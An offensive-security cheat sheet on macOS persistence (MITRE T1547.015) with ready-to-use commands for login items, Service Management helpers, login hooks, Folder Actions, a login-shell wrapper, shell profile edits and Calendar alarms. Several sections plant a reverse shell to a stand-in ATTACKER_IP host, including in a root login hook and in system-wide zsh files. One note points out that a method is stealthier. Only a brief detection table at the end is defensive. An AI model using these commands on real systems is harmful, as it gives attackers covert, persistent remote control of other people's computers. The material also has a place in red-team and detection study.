# macOS Login Items Persistence

Persist through user login using various login item mechanisms.

**MITRE ATT&CK**: T1547.015 — Login Items

---

## 1. Login Items via AppleScript (System Events)

```applescript
-- Add a login item (visible in System Preferences → Users & Groups → Login Items)
tell application "System Events"
    make login item at end with properties {path:"/path/to/payload.app", hidden:true}
end tell
```

```bash
# Via command line
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/Users/user/payload.app", hidden:true}'

# List current login items
osascript -e 'tell application "System Events" to get the name of every login item'

# Remove a login item
osascript -e 'tell application "System Events" to delete login item "payload"'
```

---

## 2. SMLoginItemSetEnabled (Service Management)

Register a helper app as a login item through the Service Management framework. More stealthy — doesn't appear in System Preferences login items list on older macOS versions.

```swift
// In the main app:
import ServiceManagement

let success = SMLoginItemSetEnabled("com.company.helper" as CFString, true)
// The helper must be in Contents/Library/LoginItems/ inside the main app bundle
```

```bash
# Check for SMLoginItem helpers
find /Applications -name "*.app" -exec find {} -path "*/Library/LoginItems/*" \; 2>/dev/null
```

---

## 3. Background Task Management (macOS 13+)

macOS Ventura introduced `SMAppService` which shows in System Settings → General → Login Items.

```swift
import ServiceManagement

// Register as login item (user sees notification)
try SMAppService.mainApp.register()

// Register a LaunchAgent
try SMAppService.agent(plistName: "com.company.agent.plist").register()

// Register a LaunchDaemon
try SMAppService.daemon(plistName: "com.company.daemon.plist").register()
```

---

## 4. Login Hook (Deprecated but Functional)

```bash
# Set a login hook (runs script at login as root)
sudo defaults write com.apple.loginwindow LoginHook /path/to/script.sh

# Set a logout hook
sudo defaults write com.apple.loginwindow LogoutHook /path/to/cleanup.sh

# Check current hooks
defaults read com.apple.loginwindow LoginHook 2>/dev/null
defaults read com.apple.loginwindow LogoutHook 2>/dev/null

# Remove
sudo defaults delete com.apple.loginwindow LoginHook
```

**Login hook script template:**
```bash
#!/bin/bash
# Runs as root at login. $1 = username of the user logging in
USERNAME="$1"
/bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" &
exit 0
```

---

## 5. Folder Actions

Attach a script to a folder that executes when files are added/removed.

```bash
# Create the Folder Action script
mkdir -p ~/Library/Scripts/Folder\ Action\ Scripts/

cat > ~/Library/Scripts/Folder\ Action\ Scripts/payload.scpt << 'APPLESCRIPT'
on adding folder items to this_folder after receiving these_items
    do shell script "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &"
end adding folder items to
APPLESCRIPT

# Attach to a frequently-used folder (e.g., Downloads)
# Via System Events:
osascript << 'EOF'
tell application "System Events"
    tell folder action "Downloads"
        -- attach script
    end tell
end tell
EOF
```

```bash
# Alternatively, manually set via Finder:
# Right-click folder → Services → Folder Actions Setup
# Or use Automator to create a Folder Action workflow
```

---

## 6. Directory Utility Login Scripts

```bash
# Open Directory Utility (requires admin)
# Users & Groups → select user → Login Shell
# Change to a wrapper script that runs payload then launches real shell

# Create wrapper shell
cat > /usr/local/bin/login_shell.sh << 'EOF'
#!/bin/bash
# Payload
(/bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" &) 2>/dev/null
# Launch real shell
exec /bin/zsh -l
EOF
chmod +x /usr/local/bin/login_shell.sh

# Change user's shell (requires admin/root)
sudo dscl . -change /Users/targetuser UserShell /bin/zsh /usr/local/bin/login_shell.sh
```

---

## 7. Shell Profile Persistence

```bash
# .zshrc / .zshenv / .zprofile (zsh is default on modern macOS)
echo '(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &) 2>/dev/null' >> ~/.zshrc
echo '(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &) 2>/dev/null' >> ~/.zshenv  # Runs for ALL zsh invocations

# .bash_profile / .bashrc (if user uses bash)
echo '(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &) 2>/dev/null' >> ~/.bash_profile

# System-wide (requires root)
echo '(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &) 2>/dev/null' >> /etc/zshenv
echo '(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &) 2>/dev/null' >> /etc/zprofile
```

---

## 8. AppleScript Persistence via Calendar/Reminders

```applescript
-- Create a repeating calendar event that runs a script
tell application "Calendar"
    tell calendar "Calendar"
        set newEvent to make new event with properties {summary:"Sync", start date:(current date), end date:(current date) + 1 * minutes}
        tell newEvent
            make new open file alarm at end with properties {trigger interval:-1, filepath:"/path/to/payload.app"}
        end tell
    end tell
end tell
```

---

## Detection

| Mechanism | Detection Location |
|-----------|-------------------|
| Login Items | `~/Library/Application Support/com.apple.backgroundtaskmanagementagent/` |
| LoginHook | `defaults read com.apple.loginwindow LoginHook` |
| Folder Actions | `~/Library/Scripts/Folder Action Scripts/` |
| Shell profiles | `~/.zshrc`, `~/.zshenv`, `/etc/zshenv`, `/etc/zprofile` |
| SMLoginItem | `Contents/Library/LoginItems/` in app bundles |
